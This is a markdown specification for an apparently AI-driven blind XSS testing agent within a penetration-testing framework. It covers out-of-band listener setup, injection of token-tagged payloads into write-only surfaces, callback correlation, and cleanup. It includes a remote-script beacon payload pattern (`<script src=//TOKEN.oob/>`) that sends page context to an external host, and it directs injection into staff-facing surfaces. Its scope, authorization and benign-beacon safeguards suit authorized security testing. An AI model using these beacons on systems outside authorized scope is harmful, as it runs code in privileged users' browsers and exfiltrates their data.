# Blind XSS Agent

> ONE variant agent of the XSS class (siblings: `xss-reflected`, `xss-stored`, `xss-dom`).
> Consumes `xss_context.json` points with `variant_hint: blind` (accepted-but-unseen inputs,
> header sinks) + the UNREACHABLE render surfaces handed off by `xss-stored`.
> The ONLY variant confirmed purely OUT-OF-BAND — it requires `scope.yaml` `oob.collaborator`.
> ACTIVE + findings-producing → imports `_contract/roe-gate.md`; carries BOTH `review.md` + `verify.md`.
> ASYNC: payloads may fire minutes–days later; no callback yet is NOT a failure (see §Safety/review).

## Interview
- **STEPS:** ingest blind candidates → stand up OOB listener → craft token-tagged beacon payloads → inject across every write-only surface → await callbacks → correlate callback→injection (unique token) → capture fired context → rate → emit findings → cleanup → review → verify.
- **TOOLS:** OOB infra (`interactsh` / Burp Collaborator / XSSHunter-style beacon); inject via `_contract/anti-automation-ladder.md` + interceptor; token map; async callback poller. No headless-exec confirmation — detection IS the callback.
- **GOAL:** Confirm blind XSS — a payload that executes in an UNSEEN, often privileged context (admin console, log/ticket viewer, email/PDF renderer), proven by an out-of-band callback that identifies where it fired and maps back to the injecting input. Done = all checklist boxes checked, `review.md` passes; a *finding* requires an attributable callback.
- **OUTPUT:** `blind_candidates.json`, `oob_config.json`, `injections.jsonl`, `callbacks.jsonl`, `findings.json`, `poc/`, `cleanup.md`, `report.md`, `curl_commands.sh`, `logs/`.
- **DATA / RAG:** inputs = `xss_context.json` (`variant_hint: blind`, header sources, accepted-unseen) + `xss-stored/render_map.json` (surfaces with `reachable_by_tester: false`) + `scope.yaml` (`oob.collaborator` **required**). `refs/` = `blind_payloads.md`, `blind_surfaces.md`. Chains FROM `xss-context` (+ `xss-stored` handoff); chains TO `reporting`.
- **DECOMPOSITION:** this IS the blind variant. Strong overlap with stored — boundary: tester can SEE the render ⇒ `xss-stored`; cannot ⇒ blind (OOB). De-dupe across both.

## Goal
Find blind XSS: input stored/processed on a surface the tester cannot observe, that executes when
a privileged user/system renders it — detected via an OOB callback carrying the fire context.
Emit an evidenced `findings.json` (schema `_contract/finding.schema.json`).
DONE = `checklist.md` all `- [x]` · `review.md` PASS · every finding backed by an attributable callback and `review.verdict = accepted`.

## What do we want
- Write-only / unseen surfaces that accept input (and WHO renders them)
- A token-tagged beacon payload per injection (token → injection point map)
- Out-of-band callbacks proving execution + the fired context (where, which viewer, minimal exfil)
- Attribution: each callback mapped to the exact injecting input/surface
- CVSS (privileged-context blind XSS often ranks high) + cleanup record

## Steps  (action · tool · output)
1. Ingest blind candidates (unseen/accepted inputs, header sinks, stored handoffs) · `jq xss_context.json` + `xss-stored/render_map.json` · `blind_candidates.json`
2. Stand up the OOB listener (unique subdomain/token scheme) · `interactsh-client` / Collaborator · `oob_config.json`
3. Craft token-tagged beacon payloads per likely renderer/context · `refs/blind_payloads.md` · (into injections)
4. Inject across every write-only surface (forms, headers, filenames, profile/API fields, webhooks) · ladder + interceptor · `injections.jsonl` (token → point)
5. Poll for callbacks (async; respect the engagement window) · OOB poller · `callbacks.jsonl`
6. Correlate each callback to its injection via token; capture fired context · synth · (into findings)
7. Rate (CVSS) + write finding (callback-backed only) · synth · `findings.json`
8. Record injected artifacts + removal steps · synth · `cleanup.md`
9. Emit report + injection commands · synth + `printf` · `report.md`, `curl_commands.sh`
10. /REVIEW SKILL (mechanical) · `review.md` → `verify_completion.py`
11. /VERIFY (semantic) · `verify.md` (subagent)

## Tools
- **OOB infra (required):** `interactsh-client`, Burp Collaborator, or an XSSHunter-style beacon host
- **Injection:** `_contract/anti-automation-ladder.md`, interceptor (Caido / mitmproxy)
- **Beacon payload:** remote `<script src=//TOKEN.oob/>` that exfils minimal context (`document.domain`, URL, `document.cookie.length`, a DOM snippet)
- **Correlation:** unique per-injection token embedded in the OOB hostname/path
- **Fetch ladder:** `_contract/anti-automation-ladder.md`

## Inputs
- `xss_context.json`: points with `variant_hint: blind`, header sources, accepted-but-unseen inputs — schema `_contract/xss_context.schema.json`
- `xss-stored/render_map.json`: entries with `reachable_by_tester: false` (handoff)
- `scope.yaml`: `oob.collaborator` (**required**), RoE window, scope
- `refs/`: `blind_payloads.md`, `blind_surfaces.md`

## Outputs
`blind_candidates.json` · `oob_config.json` · `injections.jsonl` · `callbacks.jsonl` · `findings.json` · `poc/` · `cleanup.md` · `report.md` · `curl_commands.sh` · `logs/`

## Phases
- **Phase 1 (generic):** candidate ingest + OOB listener setup + token-tagged injection across surfaces.
- **Phase 2 (target-specific):** callback correlation + fired-context capture + rating + cleanup (spans the async wait).

## Safety
Active, persistent, AND fires in someone else's (often staff) context — treat like stored, plus:
- **Benign beacons only.** The payload proves execution and reports minimal context (`document.domain`,
  `document.cookie.length` — never the cookie, never actions). No worm, no data theft against staff.
- **Async window.** Callbacks may land minutes–days later; keep the OOB listener and token map for the
  engagement window. An empty `callbacks.jsonl` at review time is a valid liveness PASS (injection ran) —
  it just yields no finding yet.
- **Approval + cleanup.** Injecting into staff-facing surfaces leans on RoE (`prod_touch_requires_approval`);
  record every injected artifact in `cleanup.md` and remove at window end unless retention was requested.
- Scope-gate every injection; rate-limit; audit-log (incl. the token map, for attribution + cleanup).
